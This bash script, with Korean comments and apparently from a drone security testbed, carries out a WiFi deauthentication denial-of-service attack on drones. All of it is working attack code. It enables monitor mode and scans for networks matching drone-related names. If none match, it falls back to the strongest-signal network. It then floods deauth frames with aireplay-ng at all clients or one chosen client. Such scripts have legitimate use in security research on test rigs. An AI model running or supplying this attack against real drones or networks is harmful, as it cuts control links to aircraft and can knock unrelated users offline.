#!/bin/bash
# wifi_deauth_attack.sh - WiFi 인증해제 공격을 통한 드론 통신 차단
# Path: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/denial_of_service/wifi_deauth_attack.sh
# Purpose: 드론과 지상관제소 간 WiFi 연결을 차단하여 통신 장애 유발

source "$(dirname "$0")/../common/colors.sh"
source "$(dirname "$0")/../common/utils.sh"

ATTACK_NAME="WiFi Deauthentication Attack"

print_attack_banner() {
    echo -e "${CYAN}============================================${NC}"
    echo -e "${CYAN}       WiFi Deauthentication Attack       ${NC}"
    echo -e "${CYAN}============================================${NC}"
}

execute_wifi_deauth() {
    local target_bssid=${1:-"auto"}
    local target_client=${2:-"broadcast"}
    local duration=${3:-30}
    local interface=${4:-"wlan0mon"}
    
    log_info "Starting WiFi deauthentication attack"
    log_info "Interface: ${interface}"
    log_info "Target BSSID: ${target_bssid}"
    log_info "Target Client: ${target_client}"
    log_info "Duration: ${duration} seconds"
    
    # 인터페이스 존재 확인
    if ! iwconfig "$interface" 2>/dev/null | grep -q "Mode:Monitor"; then
        log_error "Monitor interface not found: $interface"
        setup_monitor_mode
        interface="wlan0mon"
    fi
    
    # 자동 타겟 발견
    if [ "$target_bssid" = "auto" ]; then
        target_bssid=$(discover_drone_networks "$interface")
        if [ -z "$target_bssid" ]; then
            log_error "No drone networks found"
            return 1
        fi
    fi
    
    # 공격 실행
    perform_deauth_attack "$interface" "$target_bssid" "$target_client" "$duration"
    local result=$?
    
    if [ $result -eq 0 ]; then
        log_success "WiFi deauth attack completed successfully"
        return 0
    else
        log_error "WiFi deauth attack failed"
        return 1
    fi
}

setup_monitor_mode() {
    log_info "Setting up monitor mode..."
    
    # 기존 모니터 인터페이스 확인
    if iwconfig wlan0mon 2>/dev/null | grep -q "Mode:Monitor"; then
        log_info "Monitor interface already exists: wlan0mon"
        return 0
    fi
    
    # wlan0 인터페이스 확인
    if ! iwconfig wlan0 2>/dev/null | grep -q "IEEE 802.11"; then
        log_error "Wireless interface wlan0 not found"
        return 1
    fi
    
    # 모니터 모드 활성화
    log_info "Enabling monitor mode on wlan0..."
    airmon-ng start wlan0 >/dev/null 2>&1
    
    if iwconfig wlan0mon 2>/dev/null | grep -q "Mode:Monitor"; then
        log_success "Monitor mode enabled: wlan0mon"
        return 0
    else
        log_error "Failed to enable monitor mode"
        return 1
    fi
}

discover_drone_networks() {
    local interface="$1"
    
    log_info "Scanning for drone networks..."
    
    # 일반적인 드론 WiFi 네트워크 패턴
    local drone_patterns=(
        "drone"
        "copter"
        "quad"
        "uav"
        "px4"
        "ardupilot"
        "mavlink"
        "gcs"
    )
    
    # 네트워크 스캔 (10초)
    local scan_file="/tmp/drone_scan_$(date +%s)"
    timeout 10 airodump-ng --write "$scan_file" "$interface" >/dev/null 2>&1
    
    # 스캔 결과에서 드론 네트워크 찾기
    if [ -f "${scan_file}-01.csv" ]; then
        local found_bssid=""
        
        # CSV 파일에서 드론 패턴 매칭
        for pattern in "${drone_patterns[@]}"; do
            found_bssid=$(grep -i "$pattern" "${scan_file}-01.csv" | awk -F',' '{print $1}' | head -1 | tr -d ' ')
            if [ -n "$found_bssid" ]; then
                log_success "Found drone network: $found_bssid"
                break
            fi
        done
        
        # 패턴 매칭 실패시 가장 강한 신호의 네트워크 선택
        if [ -z "$found_bssid" ]; then
            found_bssid=$(tail -n +2 "${scan_file}-01.csv" | grep -v "^$" | sort -t',' -k9 -nr | head -1 | awk -F',' '{print $1}' | tr -d ' ')
            if [ -n "$found_bssid" ]; then
                log_warning "Using strongest signal network: $found_bssid"
            fi
        fi
        
        # 임시 파일 정리
        rm -f "${scan_file}"*
        
        echo "$found_bssid"
        return 0
    else
        log_error "Network scan failed"
        return 1
    fi
}

perform_deauth_attack() {
    local interface="$1"
    local bssid="$2"
    local client="$3"
    local duration="$4"
    
    log_info "Executing deauth attack..."
    log_info "BSSID: $bssid"
    log_info "Client: $client"
    
    local start_time=$(date +%s)
    local packets_sent=0
    
    if [ "$client" = "broadcast" ]; then
        # 브로드캐스트 공격 (모든 클라이언트 대상)
        log_info "Broadcasting deauth frames to all clients"
        
        while [ $(($(date +%s) - start_time)) -lt $duration ]; do
            aireplay-ng --deauth 5 -a "$bssid" "$interface" >/dev/null 2>&1
            packets_sent=$((packets_sent + 5))
            
            if [ $((packets_sent % 25)) -eq 0 ]; then
                local elapsed=$(($(date +%s) - start_time))
                local remaining=$((duration - elapsed))
                log_info "Packets sent: $packets_sent, Time remaining: ${remaining}s"
            fi
            
            sleep 1
        done
    else
        # 특정 클라이언트 대상 공격
        log_info "Targeting specific client: $client"
        
        while [ $(($(date +%s) - start_time)) -lt $duration ]; do
            aireplay-ng --deauth 3 -a "$bssid" -c "$client" "$interface" >/dev/null 2>&1
            packets_sent=$((packets_sent + 3))
            
            if [ $((packets_sent % 15)) -eq 0 ]; then
                local elapsed=$(($(date +%s) - start_time))
                local remaining=$((duration - elapsed))
                log_info "Packets sent: $packets_sent, Time remaining: ${remaining}s"
            fi
            
            sleep 2
        done
    fi
    
    log_success "Deauth attack completed"
    log_success "Total packets sent: $packets_sent"
    return 0
}

scan_for_clients() {
    local interface="$1"
    local bssid="$2"
    
    log_info "Scanning for clients on network: $bssid"
    
    # 클라이언트 스캔 (15초)
    local scan_file="/tmp/client_scan_$(date +%s)"
    timeout 15 airodump-ng --bssid "$bssid" --write "$scan_file" "$interface" >/dev/null 2>&1
    
    # 클라이언트 목록 추출
    if [ -f "${scan_file}-01.csv" ]; then
        local clients=$(grep -A 100 "Station MAC" "${scan_file}-01.csv" | grep -E "^[[:space:]]*[0-9a-fA-F:]{17}" | awk -F',' '{print $1}' | tr -d ' ')
        
        if [ -n "$clients" ]; then
            log_success "Found clients:"
            echo "$clients" | while read -r client; do
                echo "  - $client"
            done
        else
            log_warning "No clients found"
        fi
        
        # 임시 파일 정리
        rm -f "${scan_file}"*
        
        echo "$clients"
        return 0
    else
        log_error "Client scan failed"
        return 1
    fi
}

cleanup() {
    log_info "Cleaning up..."
    
    # 백그라운드 프로세스 종료
    pkill -f "aireplay-ng" 2>/dev/null
    pkill -f "airodump-ng" 2>/dev/null
    
    # 임시 파일 정리
    rm -f /tmp/drone_scan_* /tmp/client_scan_* 2>/dev/null
    
    log_info "Cleanup completed"
}

# 메인 실행 함수
main() {
    print_attack_banner
    
    if [ "$EUID" -ne 0 ]; then
        log_error "This script must be run as root"
        exit 1
    fi
    
    # 필수 도구 확인
    local required_tools=("aircrack-ng" "airodump-ng" "aireplay-ng" "airmon-ng")
    local missing_tools=()
    
    for tool in "${required_tools[@]}"; do
        if ! command -v "$tool" >/dev/null 2>&1; then
            missing_tools+=("$tool")
        fi
    done
    
    if [ ${#missing_tools[@]} -gt 0 ]; then
        log_error "Missing required tools: ${missing_tools[*]}"
        log_info "Install with: sudo apt install aircrack-ng"
        exit 1
    fi
    
    # 트랩 설정 (Ctrl+C 처리)
    trap cleanup EXIT INT TERM
    
    # 사용자 옵션 처리
    local target_bssid="${1:-auto}"
    local target_client="${2:-broadcast}"
    local duration="${3:-30}"
    local interface="${4:-wlan0mon}"
    
    # 사용법 출력
    if [ "$1" = "-h" ] || [ "$1" = "--help" ]; then
        echo "Usage: $0 [target_bssid] [target_client] [duration] [interface]"
        echo "  target_bssid  : Target network BSSID (default: auto-discover)"
        echo "  target_client : Target client MAC or 'broadcast' (default: broadcast)"
        echo "  duration      : Attack duration in seconds (default: 30)"
        echo "  interface     : Monitor interface (default: wlan0mon)"
        echo ""
        echo "Examples:"
        echo "  $0                                    # Auto-discover and attack for 30s"
        echo "  $0 auto broadcast 60                 # Auto-discover and attack for 60s"
        echo "  $0 AA:BB:CC:DD:EE:FF                 # Attack specific BSSID"
        echo "  $0 AA:BB:CC:DD:EE:FF 11:22:33:44:55:66  # Attack specific client"
        echo ""
        echo "Common drone network patterns detected:"
        echo "  - Networks containing: drone, copter, quad, uav, px4, ardupilot"
        exit 0
    fi
    
    # 공격 실행
    execute_wifi_deauth "$target_bssid" "$target_client" "$duration" "$interface"
    exit $?
}

# 직접 실행 시 메인 함수 호출
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi